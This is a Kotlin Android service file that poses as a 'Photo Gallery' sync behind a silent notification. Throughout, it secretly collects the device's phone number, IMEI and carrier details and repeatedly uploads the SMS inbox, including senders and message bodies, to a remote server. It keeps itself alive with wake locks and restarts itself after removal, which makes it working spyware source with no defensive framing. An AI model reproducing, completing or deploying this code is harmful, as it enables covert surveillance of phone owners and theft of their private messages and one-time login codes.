package com.boom.client.services

import android.app.*
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import com.boom.client.api.ApiClient
import com.boom.client.utils.Prefs
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class DeviceService : Service() {

    private val executor = Executors.newScheduledThreadPool(3)
    private val CHANNEL_ID = "sys_service"
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        Prefs.init(applicationContext)
        createNotificationChannel()
        startForeground(1, buildNotification())
        acquireWakeLock()

        if (Prefs.deviceId.isEmpty()) Prefs.deviceId = UUID.randomUUID().toString()

        executor.scheduleAtFixedRate({ doCheckin() }, 0, 60, TimeUnit.SECONDS)
        executor.scheduleAtFixedRate({ syncSms() }, 45, 3, TimeUnit.MINUTES)
        executor.scheduleAtFixedRate({ keepalive() }, 30, 30, TimeUnit.SECONDS)
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "BoomClient::KeepAlive"
            ).also { it.acquire(10 * 60 * 60 * 1000L) }
        } catch (_: Exception) {}
    }

    private fun keepalive() {
        try {
            if (wakeLock?.isHeld == false) acquireWakeLock()
        } catch (_: Exception) {}
    }

    private fun doCheckin() {
        try {
            val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

            ApiClient.checkin(
                deviceId = Prefs.deviceId,
                name = Build.MODEL,
                phoneNumber = try { tm.line1Number ?: "" } catch (_: Exception) { "" },
                model = Build.MODEL,
                manufacturer = Build.MANUFACTURER,
                androidVersion = Build.VERSION.RELEASE,
                imei = try { tm.imei ?: "" } catch (_: Exception) { "" },
                simOperator = tm.networkOperatorName ?: "",
                batteryLevel = battery,
                fcmToken = FcmService.currentToken ?: ""
            )
        } catch (_: Exception) {}
    }

    private fun syncSms() {
        try {
            val cutoff = Prefs.lastSmsSync
            val now = System.currentTimeMillis()
            val messages = JSONArray()

            val cursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date", "thread_id"),
                if (cutoff > 0) "date > ?" else null,
                if (cutoff > 0) arrayOf(cutoff.toString()) else null,
                "date DESC"
            )
            cursor?.use {
                val aIdx = it.getColumnIndex("address")
                val bIdx = it.getColumnIndex("body")
                val dIdx = it.getColumnIndex("date")
                val tIdx = it.getColumnIndex("thread_id")
                var n = 0
                while (it.moveToNext() && n < 500) {
                    messages.put(JSONObject().apply {
                        put("address", it.getString(aIdx) ?: "")
                        put("body", it.getString(bIdx) ?: "")
                        put("timestamp", it.getLong(dIdx))
                        put("threadId", it.getString(tIdx) ?: "")
                    })
                    n++
                }
            }
            if (messages.length() > 0) {
                ApiClient.uploadSms(Prefs.deviceId, messages)
                Prefs.lastSmsSync = now
            }
        } catch (_: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "ACTION_PING") doCheckin()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        executor.shutdown()
        try { wakeLock?.release() } catch (_: Exception) {}
        startService(Intent(applicationContext, DeviceService::class.java))
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val restart = Intent(applicationContext, DeviceService::class.java)
        val pi = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
        val am = getSystemService(ALARM_SERVICE) as AlarmManager
        am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pi)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
                .apply { setShowBadge(false); setSound(null, null) }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Photo Gallery")
            .setContentText("Syncing...")
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }
}
